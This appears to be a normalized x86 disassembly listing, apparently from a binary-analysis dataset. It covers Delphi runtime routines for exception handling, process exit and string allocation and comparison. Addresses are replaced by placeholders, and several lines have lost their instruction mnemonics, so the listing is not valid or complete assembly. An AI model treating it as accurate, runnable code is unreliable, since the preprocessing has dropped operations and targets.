mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_405c34
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_40a7e8
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_405c70
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x34 ]
cmp ecx [ edi - 0x34 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x30 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x38 ]
mov edx [ edi - 0x38 ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_404aec
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_405fd0
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
push ebx
xor ebx ebx
push esi
push edi
push ebp
push ebp
push sub_406050
push [ fs : ebx ]
mov [ fs : ebx ] esp
mov ebx [ fs : ebx ]
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
push ebx
push eax
push edx
push ecx
mov edi [ esp + 0x34 ]
call sub_40a7e8
push [ eax ]
mov [ eax ] esp
mov ecx [ edi + 0x4 ]
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] sub_406050
add ecx 0x5
call sub_405cb8
call ecx
call sub_40a7e8
mov ecx [ eax ]
mov edx [ ecx ]
mov [ eax ] edx
add esp 0x14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_406050
jmp r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_405cb8
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_4060b0
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
mov eax esp
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax 0xd8
call sub_4067e0
jmp [ rw-data ]
push [ eax + 0x18 ]
push [ eax + 0x14 ]
push [ eax + 0x10 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
push 0x7
push [ eax ]
push eax
push edx
call sub_4042fc
mov ecx eax
pop edx
pop eax
test ecx ecx
je r-xdata
push ecx
push 0x1
push 0xeedfade
mov eax esp
call edx
add esp 0x30
mov ecx [ ecx + 0xc ]
sub_406120
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_40a7e8
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_4055f0
call sub_405c18
sub_406174
call sub_40a7e8
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_4055f0
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_405ce0
jmp edx
sub_4061bc
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
movzx eax al
mov edx [ edx + 0xc ]
call sub_404308
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_40631c
mov eax [ eax + 0x4 ]
xor edx edx
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_406344
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ rw-data ]
mov edi [ eax + 0x4 ]
xor eax eax
push ebp
push sub_406392
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ rw-data ] ebx
mov esi [ edi + ebx * 8 + 0x4 ]
test esi esi
je r-xdata
test ebx ebx
jg r-xdata
cmp [ esi ] 0x0
je r-xdata
call esi
sub_4063ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov edi [ eax ]
xor ebx ebx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4063fe
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test esi esi
je r-xdata
cmp edi ebx
jg r-xdata
cmp [ esi ] 0x0
je r-xdata
call esi
sub_406418
mov [ rw-data ] sub_402458
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
mov eax rw-data
call sub_4062fc
mov [ rw-data ] 0x0
call sub_4063ac
retn
sub_406460
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4064a8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_40a204
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx 0x0
call sub_4072d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4064af
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_4064b4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4064f7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_40a204
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_40730c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4064fe
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_406518
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
call sub_406460
jmp r-xdata
dec ecx
je r-xdata
add esi 0xc
dec edi
jne r-xdata
call sub_4064b4
jmp r-xdata
dec ecx
je r-xdata
mov eax [ esi + 0x4 ]
mov eax [ eax + ebx ]
mov edx [ esi ]
add edx ebx
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
pop esi
pop edi
pop ebx
retn
call sub_406504
int3
sub_40655c
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_4065a0
push ebx
push esi
push edi
mov edi rw-data
mov bl 0x10
mov esi [ rw-data ]
mov eax esi
mov ecx 0xa
cdq
idiv ecx
add dl 0x30
movzx eax bl
mov [ edi + eax ] dl
mov ecx 0xa
mov eax esi
cdq
idiv ecx
mov esi eax
dec ebx
test esi esi
jne r-xdata
mov bl 0x1c
mov esi [ rw-data ]
mov eax esi
and eax 0xf
inc eax
mov edx [ rw-data ]
movzx eax [ edx + eax - 0x1 ]
movzx edx bl
mov [ edi + edx ] al
mov ecx 0x10
mov eax esi
xor edx edx
div ecx
mov esi eax
dec ebx
test esi esi
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_40660c
mov edi eax
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xc
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
leave
retn 0xc
sub_406638
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call MessageBoxA
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1d
push rw-data
push 0xfffffff5
call sub_402450
push eax
call sub_402488
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_402450
push eax
call sub_402488
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_4066c8
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov edi rw-data
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_4065a0
call sub_406638
xor eax eax
mov [ rw-data ] eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
call sub_402598
cmp eax [ rw-data ]
jne r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax rw-data
call sub_40631c
mov eax rw-data
call sub_40660c
call sub_406344
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ edi ]
mov esi eax
xor eax eax
mov [ edi ] eax
call esi
cmp [ edi ] 0x0
jne r-xdata
mov edi [ ebx + 0x10 ]
test edi edi
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov eax ebx
call sub_40631c
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
mov eax edi
call sub_409c44
mov ebp [ ebx + 0x10 ]
mov esi [ ebp + 0x10 ]
cmp esi [ ebp + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test esi esi
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
call sub_40660c
push esi
call sub_4024d8
mov eax [ ebx ]
mov esi eax
mov edi ebx
mov ecx 0xc
[ edi ] [ esi ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call ExitProcess
call [ rw-data ]
sub_4067ec
push ebp
mov ebp esp
call sub_4054a4
push ebp
xor ecx ecx
push r-xdata
mov edx [ fs : ecx ]
push edx
mov [ fs : ecx ] esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
call sub_404220
pop edx
pop eax
call edx
xor edx edx
pop ecx
mov [ fs : edx ] ecx
pop ecx
pop ebp
pop ebp
retn 0x4
sub_406824
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x8
call sub_404204
mov [ eax ] ebx
mov [ eax + 0x4 ] esi
mov edx esi
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov [ rw-data ] 0x1
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax sub_4067ec
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call sub_4024a8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_4068a0
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0xc ]
call sub_404220
pop eax
sub_4068c4
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0xc ]
call sub_404220
sub_4068f4
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
cmp [ edx - 0xa ] 0x1
je r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
mov ecx [ rw-data ]
jmp sub_4072d4
[ edx - 0x8 ]
jne r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
movzx edx [ edx - 0xc ]
call sub_406950
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4043c8
pop edx
pop eax
jmp r-xdata
lea eax [ edx - 0xc ]
call sub_404220
sub_406950
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xe
jo r-xdata
jmp sub_4054b8
and eax 0xfffffffe
push edx
push eax
call sub_404204
pop edx
pop ecx
mov [ edx + eax - 0x2 ] 0x0
add eax 0xc
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
test ecx ecx
jne r-xdata
mov edx ecx
mov [ eax - 0xc ] dx
mov [ eax - 0xa ] 0x1
retn
mov ecx [ rw-data ]
sub_40699c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
movzx edx [ ebp + 0x8 ]
call sub_406950
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_4068a0
mov [ ebx ] edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx eax
mov eax esi
call sub_4043c8
sub_4069d4
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push 0x0
push esi
call sub_402570
pop esi
pop ebp
retn 0x8
mov esi [ rw-data ]
sub_406a1c
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_402550
pop ebp
retn 0x8
sub_406a90
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp + 0x8 ]
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
test bx bx
jne r-xdata
mov eax edi
call sub_4068a0
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
movzx eax bx
push eax
mov ecx [ ebp - 0x4 ]
xor edx edx
xor eax eax
call sub_4069d4
mov esi eax
mov eax edi
xor ecx ecx
mov edx esi
call sub_406c8c
test esi esi
jle r-xdata
movzx ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_4068a0
mov eax [ ebp - 0x8 ]
push eax
movzx eax bx
push eax
mov eax [ edi ]
mov ecx [ ebp - 0x4 ]
mov edx esi
call sub_4069d4
mov eax [ edi ]
sub eax 0xc
mov [ eax ] bx
jmp r-xdata
sub_406b14
xchg [ esp ] ecx
push ecx
xor ecx ecx
test edx edx
je r-xdata
jmp sub_40699c
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_406b48
xchg [ esp ] ecx
push ecx
xor ecx ecx
test edx edx
je r-xdata
jmp sub_406a90
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_406bb0
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4043c8
pop ebx
retn
mov ecx ebx
sub_406bd4
test eax eax
je r-xdata
retn
push eax
xor ecx ecx
pop ecx
sub eax ecx
cmp cl [ eax + 0x1 ]
je r-xdata
inc eax
cmp cl [ eax + 0x2 ]
je r-xdata
inc eax
cmp cl [ eax + 0x3 ]
je r-xdata
inc eax
add eax 0x4
jmp r-xdata
cmp cl [ eax ]
je r-xdata
sub_406c24
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx - 0xa ] 0x1
je r-xdata
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push eax
call sub_406a38
pop eax
mov edx [ eax ]
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
movzx edx [ edx - 0xc ]
call sub_406950
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4043c8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0xc ]
call sub_404220
sub_406c8c
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov ebp ecx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_4068a0
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
mov edx ebp
call sub_406950
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0xa ] 0x1
je r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
push 0x0
mov eax esp
mov ecx ebp
mov edx [ ebx ]
call sub_4072d4
pop edi
mov eax edi
mov edx esi
xchg [ ebx ] edi
call sub_4043c8
mov ecx esi
sub eax 0xc
add edx 0xd
jo r-xdata
jmp sub_4054b8
push eax
mov eax esp
call sub_404238
pop eax
add eax 0xc
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
test edi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
mov eax esp
call sub_4068a0
pop edi
jmp r-xdata
sub_406d6c
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call sub_402590
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_406d90
cmp [ eax ] edx
je r-xdata
retn
test edx edx
je sub_406d54
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_406d54
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_404360
sub_406db8
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
test esi esi
jg r-xdata
lea eax [ esi + 0x1 ]
cmp eax 0x7ff
jge r-xdata
mov eax edi
call sub_406d54
jmp r-xdata
lea ebx [ esi + 0x1 ]
mov eax edi
mov edx ebx
call sub_40703c
push esi
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi ]
call sub_406f20
mov ecx [ ebp - 0x4 ]
mov edx ebx
call sub_406a1c
mov ebx eax
test ebx ebx
jge r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1004 ]
mov ecx [ ebp - 0x4 ]
mov edx 0x7ff
call sub_406a1c
mov ebx eax
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax edi
mov edx ebx
call sub_40703c
xor ebx ebx
lea edx [ ebp - 0x1004 ]
mov eax edi
mov ecx ebx
call sub_406e64
jmp r-xdata
sub_406e64
test ecx ecx
je sub_406d54
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_404360
pop edx
push [ edx ]
mov [ edx ] eax
call sub_402590
retn
sub_406e88
xor ecx ecx
test edx edx
je r-xdata
jmp sub_406e54
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_406eb8
xor ecx ecx
test edx edx
je r-xdata
jmp sub_406e64
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_406ef4
xor ecx ecx
test edx edx
je r-xdata
jmp sub_406e54
mov ecx [ edx - 0x4 ]
cmp [ edx - 0xa ] 0x1
jne r-xdata
jmp sub_406e64
xchg [ esp ] ecx
push ecx
movzx ecx [ edx - 0xc ]
xchg [ esp + 0x4 ] ecx
jmp sub_406db8
sub_406f30
test eax eax
je r-xdata
retn
push eax
xor ecx ecx
pop ecx
sub eax ecx
shr eax 0x1
cmp cx [ eax + 0x2 ]
je r-xdata
add eax 0x2
cmp cx [ eax + 0x4 ]
je r-xdata
add eax 0x2
cmp cx [ eax + 0x6 ]
je r-xdata
add eax 0x2
add eax 0x8
jmp r-xdata
cmp cx [ eax ]
je r-xdata
sub_406f64
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_406ff0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
cmp edx 0x1
jge r-xdata
sub ebx 0x4
mov ebx [ ebx ]
shr ebx 0x1
dec edx
cmp ebx edx
jge r-xdata
xor edx edx
jmp r-xdata
test ecx ecx
jge r-xdata
mov edx ebx
mov esi ebx
sub esi edx
cmp ecx esi
jge r-xdata
xor esi esi
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add edx edx
add edx eax
mov eax esi
xchg ecx eax
call sub_406e64
pop esi
pop ebx
pop ebp
retn 0x4
mov esi ecx
sub_40703c
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_406d44
pop edx
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_406d2c
mov ebx eax
mov edx [ edi ]
mov eax edx
mov [ esp ] eax
mov eax [ esp ]
test eax eax
je r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
shr eax 0x1
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov eax edx
mov edx ebx
call sub_4043c8
mov eax esi
sub_4070a8
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
cmp [ edx - 0xa ] 0x2
je r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
jmp sub_4072ac
[ edx - 0x8 ]
jne r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_407a9c
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
shl ecx 0x1
call sub_4043c8
pop edx
pop eax
jmp r-xdata
lea eax [ edx - 0xc ]
call sub_404220
sub_4070fc
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
cmp [ edx - 0xa ] 0x2
je r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
jmp sub_4072ac
[ edx - 0x8 ]
jne r-xdata
[ edx - 0x8 ]
lea eax [ edx - 0xc ]
call sub_404220
sub_407140
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
test esi esi
jg r-xdata
lea eax [ esi + 0x1 ]
cmp eax 0x7ff
jge r-xdata
mov eax edi
call j_sub_4068a0
jmp r-xdata
lea ebx [ esi + 0x1 ]
mov eax edi
mov edx ebx
call sub_40740c
push esi
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi ]
mov ecx [ ebp - 0x4 ]
mov edx ebx
call sub_406a1c
mov ebx eax
test ebx ebx
jge r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1004 ]
mov ecx [ ebp - 0x4 ]
mov edx 0x7ff
call sub_406a1c
mov ebx eax
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax edi
mov edx ebx
call sub_40740c
xor ebx ebx
lea edx [ ebp - 0x1004 ]
mov eax edi
mov ecx ebx
call sub_4071e4
jmp r-xdata
sub_4071e4
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_407a9c
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_4068a0
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
shl ecx 0x1
call sub_4043c8
sub_407224
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4071d4
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_407254
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4071e4
push edx
mov ecx edx
pop edx
